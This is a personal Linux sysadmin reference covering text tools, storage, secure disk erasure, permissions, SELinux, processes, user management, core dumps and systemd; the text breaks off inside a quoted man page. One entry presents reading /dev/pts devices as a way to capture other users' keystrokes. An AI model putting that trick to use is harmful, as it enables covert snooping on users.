# Linux System Administration Reference

My personal Linux system administration reference

## Table of Contents

- [Todo](#todo)
- [Other Resources](#other-resources)
- [General and Misc](#general-and-misc)
- [Text and File Processing](#text-and-file-processing)
- [Storage and Filesystem](#storage-and-filesystem)
  - [File and Text Searching](#file-and-text-searching)
  - [Data Processing](#data-processing)
  - [Data Erasure](#data-erasure)
  - [Storage and Filesystem Information and Management](#storage-and-filesystem-information-and-management)
  - [Access Control](#access-control)
- [Process Management](#process-management)
- [User Administration](#user-administration)
- [System Management and Observability](#system-management-and-observability)
- [Networking](#networking)
  - [Misc](#misc)
  - [DHCP](#dhcp)
  - [netplan](#netplan-netplan-runtime-cli)
  - [File Transfer](#file-transfer)
  - [Network Analysis](#network-analysis)
  - [Traffic Analysis and Manipulation](#traffic-analysis-and-manipulation)
  - [Scapy](#scapy-interactive-packet-manipulation-tool)
  - [Ettercap and Bettercap](#ettercap-and-bettercap)
  - [proxychains](#proxychains-redirect-connections-through-proxy-servers)
  - [SSH](#ssh)
  - [netfilter Firewall Framework](#netfilter-firewall-framework)
  - [netcat](#netcat-arbitrary-tcp-and-udp-connections-and-listens)
  - [dnsutils](#dnsutils)
  - [net-tools](#net-tools-deprecated-in-favor-of-iproute2)
  - [iproute2](#iproute2-replaces-net-tools)
- [Docker](#docker)
- [Git](#git)
- [Bash](#bash)
- [Vim](#vim)
- [GDB](#gdb)
- [Binary Analysis](#binary-analysis)
- [ASCII Art and Silly Stuff](#ascii-art-and-silly-stuff)
- [Credits](#credits)

# Todo

- Distinguish standard vs non-standard tools and filter out frivolous tools
- Distinguish or extract the most useful commands

# Other Resources

- [Pure bash Bible](./other-resources/pure-bash-bible/README.md) by dylanaraps (<https://github.com/dylanaraps/pure-bash-bible>)
- [Pure sh Bible](./other-resources/pure-sh-bible/README.md) by dylanaraps (<https://github.com/dylanaraps/pure-sh-bible>)

# General and Misc

- BusyBox is a package that contains many core Unix utilies needed for debugging. It's useful to install on a minimal machine when testing.
  - `busybox <common-unix-utility>` if you're just going to run a single command, maybe two
  - `busybox --install <dir-path>` to install the commands to that directory (usually `/sbin`) for standalone use of all commands
  - It comes pre-installed in the Docker Alpine image

## Commands

- Help
  - `man` (*an interface to the system reference manuals*)
    - `-a intro` to display all `intro` manpages
    - `-k` or `apropos` (*search the manual page names and descriptions*)
    - `-f` or `whatis` (*display one-line manual page descriptions*)
  - `info` (*read Info documents* interactively)
  - `help` (*display information about builtin commands*)
  - `tldr` (*simplified and community-driven man pages*)
- `parallel`
- `glow`
  - `glow -p -w 0 file.md`
- `watch` (*execute a program periodically, showing output fullscreen*)
  - `watch -n 1 w` to execute `w` every second (`-n 1`) and refresh the screen with the updated output
- `env` (*run a program in a modified environment*)
- `printenv` (*print all or part of environment*)
- Dates and Time
  - `date` (*print or set the system date and time*)
    - `date +%F` to print date in format `YYYY-MM-DD`
    - `date +%Y%m%d` to print date in format `YYYYMMDD`
    - `date +%j` to print the day of year (`j` stands for Julian, as in "the Julian day")
    - `date --date='now-100days` to calculate the full and exact date of 100 days ago from now using Julian days for this year (eg, `date +%j`)
  - `timedatectl` (*control the system time and date*)
    - See `/etc/localtime`
    - `timedatectl` to see current time settings
    - `timedatectl set-timezone America/Los_Angeles` to set timezone to Los Angeles
    - `timedatectl list-timezones`
- Package management
  - `dpkg` (*package manager for Debian*)
    - `dpkg -l`
    - `dpkg -L`
    - `dpkg -S`
  - `apt`
    - `apt list --installed` to list installed packages
    - `apt show <package>` to show information for a package
    - `apt search <string>` to find packages containing a specified string in their information (useful for finding the package a command belongs to)
- `tee` (*read from standard input and write to standard output and files*)
  - `date | tee <file>` writes the output of `date` to standard output and `<file>`
    - `tee -a <file>` to append to `<file>` instead of overwrite
- `cat /dev/urandom` (*When read, the `/dev/urandom` device returns random bytes using a pseudorandom number generator seeded from the entropy  pool*)
  - See `man urandom`
- Intrusion detection systems
  - `aide`
  - `snort`
  - `tripwire`
- `exiftool` (*read and write meta information in files*)
- `reset` (*initialize or reset terminal state*)
- `seq` (*print a sequence of numbers*)
  - `seq [from=1] <to>` to print numbers `from` to `to`, each on a new line
  - `seq 5` to print numbers 1 through 5, each on a new line
  - `seq 0 5` to print numbers 0 through 5, each on a new line

# Text and File Processing

- `nl` (*number lines of files*)
  - `nl <file>` to print out file contents with line numbers
- `uniq` (*report or omit repeated lines*)
  - `uniq <file>` to print every unique line from `<file>`, omitting repetitions
  - `uniq -u <file>` to print every unique line that occurs once in `<file>`
- `csplit` (*split a file into sections determined by context lines*)
- `tr` (*translate or delete characters*)
- `cut` (*remove sections from each line of files*)
  - `cut -d ' ' -f1 <file>` to cut the first (`-f1`) section from `<file>` delimited by blank spaces
- `bc` (*an arbitrary precision calculator language*)
  - `echo '1+2' | bc` to sum the expression
- `wc` (*print newline, word, and byte counts for each file*)
  - `wc -l` to count lines
- `head` (*output the first part of files*)
  - `-n <lines>` to output first `<lines>` lines
  - `-c <bytes>` to output first `<bytes>` bytes
- `tail` (*output the last part of files*)
  - `-n <lines>` to output last `<lines>` lines
  - `-f <file>` to follow file changes, appending output as file grows
- `sort` (*sort lines of text files*)
  - `-n` to sort numerically instead of lexicographically
  - `-r` to reverse order
  - `-k` to sort by key
    - `sort -k 2 <file>` to sort by the second column
- `paste` (*merge lines of a file*)
  - `paste <file> -sd+` to collapse lines of a file to single line with each element separated by `+`
    - Example: `seq 100 > numbers; paste numbers -sd+`
    - **Mix and Match**: `seq 100 > numbers; paste numbers -sd+ | bc` to sum the numbers in `numbers`
- `sed` (*stream editor for filtering and transforming text*)
  - `sed -n '275p' <file>` to print out the 275th line of `<file>`
- `awk` (*pattern scanning and processing language*)
  - `awk '{print $2}'` to print the second column of standard input
  - `awk '{if ($1>200) print $1,$2}'` to check if the first column of standard input is greater than 200 and print the first two columns if so
- Diffing and patching
  - `diff` (*compare files line by line*)
    - `diff --color <file1> <file2>`
  - `patch` (*apply a diff file to an original*)

# Storage and Filesystem

## General and Misc

- `hdparm` (*get/set SATA/IDE device parameters*)
  - `-I /dev/<sata-device>` to list device parameters for a SATA device
  - `hdparm --security-enhanced-erase NULL /dev/<sata-device>` to perform an optimized secure erase of a SATA device using an empty password (`NULL`)
- `nvme` (*the NVMe storage command line interface utility*; from `nvme-cli`)
  - `nvme format /dev/<nvme-device> -s 1` to perform a secure erase of an NVMe disk
    - See `man nvme-format`

### Information

- `/dev/zero` is a continuous stream of zeroes
- `stat` (*display file or file system status*)
- `ls -l <file-name>` follows the format `<access-permissions> <number-of-hard-links> <UID> <GID> <creation-month> <creation-day> <creation-time> <file-name>`
- `du` (*estimate file space usage*)
  - `-h` for human-readable format
  - `-s` for summary
- `df -h` (*report file system space usage* in human-readable format)

## File and Text Searching

- `grep` (*print lines that match patterns*)
  - `grep -Iri --exclude-dir=.git "<search-pattern>"` to search `<search-pattern>`, excluding binaries (`-I`), recursive (`-r`), case insensitive (`-i`), and excluding `.git/`
  - `grep -wE "53|67|68" /etc/services` to look up what ports 53, 67, and 68 correspond to in `/etc/services`
  - `grep '^word' <file>` to find instances of `word` that are at the beginning of a line
  - `-E` to allow "extended" regular expressions (or use `egrep`)
  - `-R` to search recursively through subdirectories (or use `rgrep`)
  - `-F` to interpret `<search-pattern>` as fixed strings, not regular expressions
  - `-w` to search whole words
  - `-l` to print only the filename on match and continues to next file
  - `-v` to print non-matching lines
  - `-e` protects `-` in expressions containing `-`
- `find`
  - Common example: `find <path> -name <filename>` to find a file
  - Flags:
    - `-exec <command> {} +` execute `<command>` in the current subdirectory, in case we are recursive and in a different directory from which we started
    - `-executable` to find files with execution permissions
    - `-name "*.sh"` to find files with `.sh` a suffix
    - `-perm 777`
    - `-perm -022`
    - `-perm /6000` to find setuid (`4000`) and setgid (`02000`) programs
    - `-type f` to find files
    - `-type d` to find directories

## Data Processing

- `cpio` (*copy files to and from archives*)
- `mkfifo` (*make FIFOs (named pipes)*)
- `dd` (*convert and copy a file*)
  - Flags:
    - `if=<file>` to specify a file to read from instead of standard input
    - `of=<file>` to specify a file to write to instead of standard output
    - `bs=<size>` to specify the block size to both read from the input file and write out to the output file
    - `count=<count>` to specify the number of times to read/write
  - Example: `dd if=/dev/zero of=zeroes bs=1M count=2` to read 2MB (`count` blocks of size `1M`) of zeroes from `/dev/zeroes` and write them out to `zeroes`
- `tar`
  - `tar -vczf files.tar.gz file1 file2 file3` to create (`-c`) a `gzip`-compressed (`-z`) archive named `files` (`-f files`) out of the listed files
  - `tar -vxf files.tar.gz` to both decompress (if applicable) and extract (`-x`) an archive named `files` (`-f files`) out into the CWD

## Data Erasure

- Prefer `hdparm` (SATA) and `nvme-cli` (NVMe) for more proper and significantly faster hardware-based secure erasure (let the drive erase itself internally) rather than software-based erasure (manual sequential writing of bytes), which usually doesn't account for "smarter" modern drive features such as wear leveling or sector remapping, which can prevent actual full secure erasure
- `shred` (*overwrite a file to hide its contents, and optionally delete it*: **do not use without understanding the caveats listed in the documentation referenced below**; **almost certainly use `hdparm` or `nvme-cli` instead**)
  - **Read the caveats before use**: <https://www.gnu.org/software/coreutils/manual/html_node/shred-invocation.html#shred-invocation>
  - `-v` to show progress
  - `-z` to zero the file after overwriting to hide shredding
  - `-u` to delete the file after overwriting
  - Example procedure
    - `wipefs --all /dev/<device>` (see `wipefs`)
    - `shred -vz /dev/<device>` to overwrite the disk with random data and then zero
    - Optional: `blockdev --rereadpt` (see `blockdev`) to inform the kernel that the partition table has been modified (assuming you overwrote a disk with paritions before clearing them out). This may not be enough, and you may need to just reboot instead.
- `nwipe` (*securely erase disks*)

## Storage and Filesystem Information and Management

### Information

- `/etc/fstab` contains a table of known filesystems
- `/dev/sda1` would be the first partition (`1`) of the first detected (`a`) disk (`sd`, short for "SCSI Disk", an old format)
- `lsblk` (*list block devices*)
  - `lsblk` to list block devices
  - `--fs` for an overview of filesystem data
- `blkid` (*locate/print block device attributes*)
- `dumpe2fs` (*dump ext2/ext3/ext4 file system information*)
  - `dumpe2fs /dev/<device>` to dump filesystem information for device

### Management

- `wipefs` (*wipe a signature from a device*)
  - `wipefs /dev/<device>` to print information about a device and its partitions
  - `wipefs --all /dev/<device>` to erase all partition signatures and inform the kernel of the change
- `fdisk` (*manipulate disk partition table*)
  - `fdisk -l [device]` to list information and partition tables for all devices or the specified device
- `mkfs` (*build a linux filesystem*; lets you format a device)
  - `mkfs.vfat /dev/<device>`
- `tune2fs` (*adjust tunable file system parameters on ext2/ext3/ext4 file systems*)
  - `tune2fs -l /dev/<device>` (*list the contents of the file system superblock, including configurable parameters*)
- `blockdev` (*call block device ioctls from the command line*)
  - `--rereadpt` to request the kernel to re-read the partition table

#### Mounting

- `findmnt` (*find a filesystem*)
- `mount` (*mount a filesystem*)
  - `mount` to see mounted filesystems
    - Reads from `/proc/mounts` (symlink to `/proc/self/mounts`) (or the **deprecated** `/etc/mtab` on older systems)
  - `mount /dev/<device> /mnt/<mount-point>` to mount a device to mount point
- `umount` (*unmount filesystems*)
  - `umount /mnt/<mount-point>` to unmount filesystem mounted at mount point
- `/proc/self/mountinfo` contains a table of mounted filesystems (generated by kernel)

## Access Control

### DAC (Discretionary Access Control)

DAC is the baseline access control scheme, where the owner of a resource (file, process, etc) specifies its permissions.

- **NOTE!** When changing file permissions, especially recursively, beware of changing directories, regular files, scripts, and so on indiscriminately
  - Typically, you'll want to use `find` in the form of `find <path> -type d -exec chmod -c <xxx> {} +` to set the appropriate permissions for, in this example, directories, and using `-type d` for directories
    - For example:
      - Directory: With `r` set on a directory, a user can read its contents. If `x` is also set, a user can `cd` into the directory
      - Regular file: With `r` set on a regular, a user can read its contents. If `x` is also set, a user can execute it. *This should not be set if the file is not supposed to be a directly-executable script*
      - Thus, while it's okay to mark subdirectories with the `x` bit (if you're okay with the user traversing them), setting `x` on regular files should be done discriminately, not en mass
- `chmod` (*change file mode bits*)
  - `-c` to show changes
  - `-R` for recursive
- `chattr` (*change file attributes on a Linux file system*)
- `chgrp` (*change group ownership*)
  - `chgrp -c <group> <file>` to change `<file>`'s `<group>` to `<group>` and show changes made (`-c`)
    - `-R` for recursive
- `chown` (*change file owner and group*)
  - `chown -c <user> <file>` to change `<file>`'s `<owner>` to `<owner>` and show changes made (`-c`)
  - `-R` for recursive
- `umask` (*display or set file mode creation mask*)
  - `umask` to see current file mode creation mask
  - `umask <mask>` to set the file mode creation mask
  - Example
    - With default regular file creation mode `0666` (RW for UGO)
    - With default umask of `0022`
    - `touch testfile` will create `testfile` with permissions `0644` (`0666 & ~0022`)

### ACL (Access Control List)

ACL extends/compliments the standard DAC scheme, providing more fine-grained control over resource permissions.

See `man acl`

- `getfacl` (*get file access control lists*)
- `setfacl` (*set file access control lists*)
  - Setting the default ACL for a directory causes new subdirectories and files to inherit those default ACLs
  - `setfacl -m u:<username>:rwx <file>` to allow R/W/X on file for the user
  - `setfacl -m u::rwx <file>` to allow R/W/X on file any users
  - `setfacl -x u:<username> <file>` to remove the ACL permissions set for the user

### MAC (Mandatory Access Control)

MAC is another access control scheme which provides a global configuration of resource permissions, typically managed by `root` rather than resource owners. The kernel checks DAC and ACL permissions on resource access before MAC, overriding the former two if more restrictive.

It is commonly found in the SELinux (Security-Enhanced Linux) and AppArmor Linux kernel modules.

#### SELinux (Security-Enhanced Linux)

*Security-Enhanced Linux (SELinux) is an implementation of a flexible mandatory access control architecture in the Linux operating system*

- See
  - `man selinux`
  - Red Hat Enterprise Linux documentation on SELinux: <https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/using_selinux/getting-started-with-selinux>
  - Rocky Linux documentation on SELinux: <https://docs.rockylinux.org/guides/security/learning_selinux/>
- `sestatus` for SELinux status
  - `-v` to see file and process contexts
  - `-b` to see policy booleans
- Configuration: `/etc/selinux/config`
- `getenforce` (*get the current mode of SELinux*)
- `setenforce` (*modify the mode SELinux is running in*)
  - `setenforce [ Enforcing | Permissive | 1 | 0 ]`
- `ls -Z [<file>]` (*print any security context*)
- `ps -eM` or `ps axZ` to see the security label of every running process
- `getsebool` to get SELinux boolean values
  - `getsebool -a` to get all boolean values
  - `getsebool httpd_can_connect_ftp` to get value of `getsebool httpd_can_connect_ftp` boolean
- `setsebool` (*set SELinux boolean value*)
  - `setsebool httpd_can_network_connect on` to set the `httpd_can_connect_ftp` boolean on, resets on reboot
  - `setsebool -P httpd_can_network_connect on` to set the `httpd_can_connect_ftp` boolean on, permanent (`-P`)

# Process Management

- The current process:
  - `echo $$` to print the PID of this current running process
  - `cd /proc/self/` to access the data for the current running process
- `strace` (*trace system calls and signals*)
  - `strace -p <PID>` to monitor syscalls made by process `<PID>`
  - `strace -p <PID> -e trace=read` to trace `read` syscalls emitted from process `<PID>`
  - `strace <command>` to run `<command>` under `strace` observation
  - **Mix and Match**: `strace -p $(pgrep <process-name>)`
- `lsof` (*list open files*)
  - `lsof /dev/tty1` to list processes currently using that file
  - `lsof -i :22` to list processes using or listening by any network address on port 22 (`netstat -p` and variants are the modern ways to do this)
- `ps` (*report a snapshot of the current processes*)
  - `ps` to report on all processes with the same EUID as the current user and processes associated with the same terminal as the invoker
  - `ps <pid>` to report on a specific process
  - `-f` for full format
  - `ps -eM` or `ps axZ` to see the security label of every running process
  - **Mix and Match**: Use a bracket expression trick `[<char>]` in `grep`'s regular expression parsing to remove `grep`'s process from `ps` output: `ps -ef | grep -i [s]sh`
    - See `Character Classes and Bracket Expressions` in `man grep`
    - This works because `grep`'s process command line now technically contains `[s]sh`, which still expands to `ssh` as our actual search term
  - Standard syntax
    - `ps -ef --forest` to *see every process on the system using standard syntax* and with *ASCII art process tree* (`--forest`)
    - `-F` for extra full format
  - BSD syntax
    - `ps aux` to *see every process on the system using BSD syntax*
    - `ps axjf` to *print a process tree*
- `pgrep`, `pkill`, `pidwait` (*look up, signal, or wait for processes based on name and other attributes*)
  - `pgrep -a <name1|name2>` to see processes matching `<name1>` or `<name2>` and show the full command lines for those processes
  - `pgrep -af <pattern>` to see processes matching `<pattern>`, as well as processes whose full commands contain `<pattern>`, and show the full command lines for those processes
  - `pgrep -u <user>` to see running processes attached to `<user>`
  - `pgrep -u <user> <process-name>` to see running processes matching `<process-name>` attached to `<user>`
- `fuser` (*identify processes using files or sockets*)
  - `fuser /dev/tty1` will show the PID of processes currently using that file
  - `fuser -v /dev/tty1` will show the user, PID, command, and how the access is being made, of processes using that file
  - `fuser -km /home` will kill (`-k`) all processes accessing the mounted directory (`-m`; as opposed to regular file?) `/home`
  - `fuser -vm /home` will list all processes accessing the mounted directory (`-m`) `/home`
- **Mix and Match**: Access the data of a specific running process
  - `cd /proc/<PID>`
    - `ls -la`
    - `cat environ` to read the environment variables for the process
    - `cat cmdline` to read the full command which started the process
    - `strace -p <PID>` to monitor syscalls made by the process
- `pidstat` (*report statistics for Linux tasks*; from `sysstat`)
  - `pidstat`
  - `-p` to report for PID

# User Administration

- `su` (*run a command with a substitute user and group ID*)
  - `su` to drop into a `root` shell
  - `su <user>` to drop into a `<user>` shell
  - `su --login <user>` to drop into a `<user>` login shell
  - `-c <command>` to run a command as the user
  - `-s <shell>` to specify shell
  - `-l` to start the shell as a login shell
- `sudo -i` to run the login shell as `root` (ie, become `root`)

## User Interaction

- `write` (*send a message to another user*)
  - `write <username> <tty-or-pts>` starts a session where you can send messages to the user on their tty, one way
- `mesg` (*display (or do not display) messages from other users*)
- `talk` (*talk to another user*)
- `wall` (*write a message to all users*)

## User and Group Awareness and Monitoring

- `whoami`(*print effective user name*)
- `id` (*print real and effective user and group IDs*)
  - `id` for output on current user
  - `id <user>` for output on specified user
- `groups` (*print the groups a user is in*; **probably prefer `id`**)
  - `groups` to show the groups the current user is in
  - `groups <user>` to show the groups `<user>` is in
- See who's logged in:
  - `who` and `w` read the binary log file `/var/run/utmp` to see currently logged in users
  - `who` (*show who is logged on*)
    - `who -H` to show who's logged in, with headings
    - `who -Ha` to show who's logged in, with most of the other flags enabled for detail
  - `w` (*show who is logged on and what they are doing*; **probably prefer `who`**)
  - `users` (*print the user names of users currently logged in to the current host*; **probably prefer `who` or `w`**)
- `last` (*show a listing of last logged in users*)
  - `last` outputs from most recent to least recent, so use with `head` or `less`
  - `last -a` reads the binary log file `/var/log/wtmp` to see past logins, with host names at the end (`-a`)
  - `last <username>` to see past logins from `<username>`
  - `last -p <time>` to see users who were present at `<time>`
  - `last -s <time>` to see past logins since `<time>`
  - `last -u <time>` to see past logins until `<time>`
  - `-x` to include shutdown entries and run level changes
  - `-d` to show DNS-resolved hostnames
  - `-i` so show IPs instead of names
- `lastb` reads the binary log file `/var/log/btmp` to see bad login attempts (I believe this is bad password attempts?)
- **Mixed and Matched**: Count past logins for a user or IP
  - `last <username-or-ip> | grep -c <username-or-ip>` (we use `grep` to search for `<username-or-ip>` again and count `-c` because `last` has a couple extra lines of output
- **Mixed and Matched**: Monitor keystrokes
  - `who -H` to see users logged in and what terminal lines they're connected to
  - `ls /dev/pts` to see pseudo terminals
  - `cat /dev/pts/n` to capture keystrokes if the user is using a pseudoterminal (Tmux, SSH, etc)
  - `cat /dev/tty` to capture keystrokes if the user is using a standard terminal
  - `tty` vs `pty`
    - A `tty` is a console directly interacted with by the user
    - A `pty` (pseudoterminal) is a connection/interface established by a program like SSH or Tmux which allows tty-like interaction via it
    - See `man pts` (*pseudoterminal master and slave*)

## User and Group Management

- Group accounts:
  - `groupmod` (*modify a group definition on the system*)
    - `groupmod -U <user> -a <group>` to append (add) (`-a`) user `-U <user>` to `<group>`
  - `groupadd` (*create a new group*)
  - `groupdel` (*delete a group*)
- User accounts:
  - `useradd`
    - `useradd <new-user> -m -s /bin/bash -g <primary-group>` to create `<new-user>` with a home directory (`-m`), `bash` as shell (`-s /bin/bash`), and with primary group `<primary-group>` (`-g <primary-group>`) (**NOTE(SECURITY): DO NOT SUPPLY PLAINTEXT PASSWORD ON COMMAND LINE, SEE MANPAGE**)
      - This creates a locked user account due to **correctly** not passing a password
        - This security warning applies to `usermod -p <new-user>`
      - `passwd -de <new-user>` to effectively unlock the account and allow the new user to log in and require them to set a password.
        - ***NOTE(SECURITY)***: Only do this **when the new user is ready to log in via password**. If the user will only ever log in via SSH, they don't even need a password. You may keep the password locked and use their public key for authentication instead of password login.
  - `userdel`
  - `usermod` (*modify a user account*)
    - `usermod -G -a <group>` to append (add) current user to `<group>`
    - `usermod <user> -p` to set password to locked `<user>` account
- `passwd` (*change user password*)
  - `passwd <user>` to change user password
  - Account status:
    - `passwd -S` to see account status for current user
    - `passwd -Sa` to see the account status for all users
  - `passwd -d` to delete a user's password (make it empty)
  - `passwd -e` to immediately expire an account's password, requiring change at next login
  - `passwd -i <INACTIVE-days>` to disable an account after password has been expired for `<INACTIVE-days>`
    - `passwd --expiredate 1` to immediately disable an account, after setting the above
  - `passwd -l` to lock the password of a user so they cannot change it
    - `passwd -u` to unlock
- User account configuration and password information
  - `pwconv` to move salted passwords hashes from public `/etc/passwd` to locked down `/etc/shadow` (use on old systems that haven't converted to using `/etc/shadow`)
  - `/etc/passwd` details user account configuration: `username:x:UID:GID:full-name:home-directory:shell`
    - The `x` in the password field means that passwords are stored in `/etc/shadow`, which has stricter permissions
      - `/etc/shadow` format (see `man shadow`): `username:encrypted-password:last-change-date:minimum-age:maximum-age:warning-period:inactivity-period:account-expiration-date:reserved`
    - All users can typically read `/etc/passwd`, but only `root` can modify it
    - Only `root` can access `/etc/shadow`
    - Salted password hashes are stored rather than the actual plaintext passwords

### Special File Permission Bits (SUID/SGID/Sticky)

- Reading: <https://www.redhat.com/en/blog/suid-sgid-sticky-bit>
- SUID/SGID
  - The SUID (setuid) permission bit of a binary executable file
    - Sets the running EUID to that of the binary executable's owner rather than that of the user who actually executed it (RUID)
    - Represented by `4` in the *user* execution bit, or symbolic `s` if the owner has execute permission and `S` if the owner does not have execute permission
  - The SGID (setgid) permission bit of a binary executable file
    - Sets the running EGID to that of the binary executable's group owner rather than that of the user's primary group that actually executed it (RGID)
    - Represented by `2` in the *group* execution bit, or symbolic `s` if the group has execute permission, or `S` if the group does not have execute permission
  - **NOTE(SECURITY)**: For files owned by a privileged user/group, SUID/SGID can permit unprivileged users to execute a program with elevated privileges when the permissions for the file are not locked down (eg, if unprivileged users are allowed to execute an SUID/SGID file)
    - For security, shells such as Bash ignore setuid and run as the real user
    - Find SUID/SGID programs with `find / -perm /6000`
- The "sticky" permission bit
  - When set on a directory, prevents users from deleting or renaming containing files they do not own
  - Does nothing when applied to regular files
  - Represented by `1` or symbolic `t` in the other users execution bit
- RUID (real user ID) is the UID for the user who launched a process
- EUID (effective user ID) is the UID from which the process inherits its permissions
- Octal/symbolic permissions format:
```
Bit positions: 0 x 0 0 0 0
                   S U G O
                   | | | |
                   | | | Other users (rwx)
                   | | Group (rwx)
                   | User/owner (rwx)
                   Special (setuid/setgid/sticky)
UGO bits: 4 2 1
          r w x
          | | |
          | | Execute
          | Write
          Read

S bits:   4 2 1
          | | |
          | | sticky (replaces Other Users' Execute bit with t if x set or T if x not set)
          | setgid (SGID; replaces Group's Execute bit with s if x set or S if x not set; affects binaries only)
          setuid (SUID; replaces User's Execute bit with s if x set or S if x not set; affects binaries only)
```

# System Management and Observability

- `sysctl` (*configure kernel parameters at runtime*)
  - `<variable>` to display a parameter
  - `-w <variable>=<value>` to set a parameter
  - `-a` to display all available parameters
  - `-p [file]` to reload the parameters set from `[file]` or `/etc/sysctl.conf`
  - `--system` to reload and display parameters set from the system's configuration files
- `hostname` (*show or set the system's host name*)
  - `/etc/hostname` specifies the persistent hostname (read on startup)
  - `hostname -I` to display IP addresses
- `uptime` (*tell how long the system has been running*, load averages, and how many users are logged in)
  - Reads and processes `/proc/uptime`
- `cat /etc/*release` to see system distribution information
  - See `find /etc/*release` to see files read to obtain this information
- `uname` (*print system information*)
  - `uname -a` to print all information
- `lsb_release` (*print distribution-specific information (minimal implementation)*)
  - `lsb_release -a` to show distributor ID, description, release number, and codename
- `cat /proc/cmdline` to see kernel command line options (**TODO**: Why is this different than the command line shown in `dmesg | head`?)
- `ulimit` (*modify shell resource limits*)
  - `ulimit -a` to report all current limits
  - `ulimit -c` to report limit on core dump size for the current shell
    - `0` indicates that core dumping is disabled
  - `ulimit -c <limit>` to specify the size limit for core dumps

## Core Dumps

**WARNING**: Enabling core dumps -- particularly universally -- can be risky. A core dump is a snapshot of a process taken at the time a process exits abnormally. Since this snapshot contains the process's memory and execution context, it can contain sensitive information. Proper care should be taken to manage core dumps when enabled, such as restricting access to other users and regular deletion. Do your own research, and don't enable them blindly.

See `man core`

### Enabling

- Ephemeral (for the current shell only)
  - `ulimit -c unlimited` to enable unlimited core dumps for the current shell only (ephemeral)
- Persistent (using shell init configuration)
  - *NOTE*: This will enable core dumps only for processes launched by the shell rather than all processes launched through any means. You can modify the PAM limits configuration if you need core dumps enabled for all processes. In addition, for `systemd`-managed sessions, you can specify the core dump limit for a specific process)
  - Append `ulimit -c unlimited` to your shell init (eg, `.bashrc`)
- Persistent (using PAM limits configuration; **NOTE**: Incomplete)
  - Create the drop-in `/etc/security/limits.d/99-coredump.conf`
  - **TODO**: Configuration file

### Core Pattern

- `/proc/sys/kernel/core_pattern` stores a pattern to specify the core save location or pipe to program to process it
- Common core patterns
  - `core.%e.%p` to store core dumps beside the program (CWD is default)
  - `/var/dumps/core.%e.%p` to store core dumps in a centralized location
  - Variables
    - `%e`: Executable name
    - `%p`: PID
    - `%t`: Timestamp (epoch)
    - `%h`: Hostname
    - `%u`: RUID
- Ephemeral modification (persists until reboot)
  - `/proc/sys/kernel/core_pattern`
- Persistent modification
  - Create the drop-in `/etc/sysctl.d/99-coredump.conf`
  - Insert `kernel.core_pattern = <core-pattern>`
  - `sysctl --system` to reload the configuration
  - Alternative method (**Not recommended**: prefer drop-in configuration to preserve this default)
    - `sysctl -w 'kernel.core_pattern = <core-pattern>'` to overwrite the current rule

## Logging

- `sar` (*collect, report, or save system activity information*)
  - `-b` for I/O statistics
  - `-n` for network statistics
- `dmesg` (*print or control the kernel ring buffer*)
  - `dmesg -Tw` (show log messages in human-readable time format (`-T`) and in real time (`-w`))
  - `dmesg | head` to see the early kernel command line options (**TODO**: Why is this different than shown in `cat /proc/cmdline`?)
  - `dmesg | tail` to see the latest log messages
- `/var/log/` contains
  - `/var/log/dmesg`
  - `/var/log/auth.log`
  - `/var/log/apt/history.log`
  - `/var/log/syslog`
  - ...and more
- `loki`
- `syslogger`

## Devices

- `lspci` (*list all PCI devices*)
- `lsusb` (*list USB devices*)
- `iostat` (*Report Central Processing Unit (CPU) statistics and input/output statistics for devices and partitions*; from `sysstat`)
  - `iostat [interval [count]] [-d] [device-name]` to report block device statistics
  - `-c` to report CPU statistics
  - `-x` for extended statistics
  - `-z` to omit statistics for devices showing no activity

## CPU

- See `iostat`
- `lscpu` (*display information about the CPU architecture*)
- `chcpu` (*configure CPUs*)
- `mpstat` (*report processor-related statistics*; from `sysstat`)
  - `mpstat` to print a summary CPU utilization report
  - `mpstat 1` to print a report every 1 second
  - `-P ALL` to print statistics for all processors
- `nproc` (*print the number of processing units available*)
- `cat /proc/cpuinfo` to see CPU specs and info
  - `cat /proc/cpuinfo | grep -c processor` to count the number of processors

## Memory

- `cat /proc/meminfo` to see detailed memory information
- `free` (*display amount of free and used memory in the system*)
  - `-h` for human-readable
  - `-t` to include total
  - `-m` to display in mebibytes
- `vmstat -S M` (show virtual memory statistics in units of MB `-S M`)

## `systemd` (*systemd system and service manager*)

- *NOTE*: See `man systemd`
- `systemctl` (*control the systemd system and service manager*; this is `systemd`'s control interface)
  - `systemctl status` to show runtime status info on the whole system
  - `systemctl status <unit>` to show runtime status info for a unit
  - `systemctl show <unit>` to show the properties of a unit
  - `systemctl cat <unit>` to show the backing files of one or more units
  - `systemctl restart <unit>` to restart a systemd unit
  - `systemctl list-units` to list units `systemd` currently has in memory
  - `systemctl list-sockets` to list socket units currently in memory, ordered by listening addresses
  - `systemctl list-timers` to list timer units currently in memory, ordered by when they elapse next
- `journalctl` (*print log entries from the systemd journal*)
  - `journalctl -f` to see log messages in real time
  - `journalctl -b` to see all logs since boot of current session
  - `journalctl -u wpa_supplicant` to see logs pertaining to the `wpa_supplicant` service
- `resolvectl` (*resolve domain names, IPV4 and IPv6 addresses, DNS resource records, and services; introspect and reconfigure the DNS resolver*)
  - Front-end (or sometimes a symlink) to `systemd-resolve` and primary way of interacting with `systemd-resolved`
  - `/etc/resolv.conf` is the standard DNS resolver configuration file for specifying DNS nameservers, usually managed by `systemd-resolved`, but sometimes by `netplan` and others depending on distro and configuration choice
  - `resolvectl` to display the global and per-link DNS settings currently in effect
  - Options
    - `status <link>` to display the DNS settings currently in effect for a link
    - `query <hostname|address>`
    - `statistics` to display general resolver statistics, including information whether DNSSEC is enabled and available, as well as resolution and validation statistics
    - `show-server-state` to display detailed server state information, per DNS Server
    - `monitor` to display a continuous stream of local client resolution queries and their responses
    - `flush-caches`
- `systemd-resolve` (**deprecated** in favor of `resolvectl`)
- `systemd-analyze` (*analyze and debug system manager*)
  - `systemd-analyze blame` to *print all running units, ordered by initialization time*

### `systemd` units

`man systemd`:
>  CONCEPTS
>         systemd provides a dependency system between various entities called "units" of 11 different types. Units encapsulate various objects that are
>         relevant for system boot-up and maintenance. The majority of units are configured in unit configuration files, whose syntax and basic set of
>         options is described in systemd.unit(5), however some are created automatically from other configuration files, dynamically from system state or
>         programmatically at runtime. Units may be "active" (meaning started, bound, plugged in, ..., depending on the unit type, see below), or "inactive"
>         (meaning stopped, unbound, unplugged, ...), as well as in the process of being activated or deactivated, i.e. between the two states (these states
>         are called "activating", "deactivating"). A special "failed" state is available as well, which is very similar to "inactive" and is entered when
>         the service failed in some way (process returned error code on exit, or crashed, an operation timed out, or after too many restarts). If this state
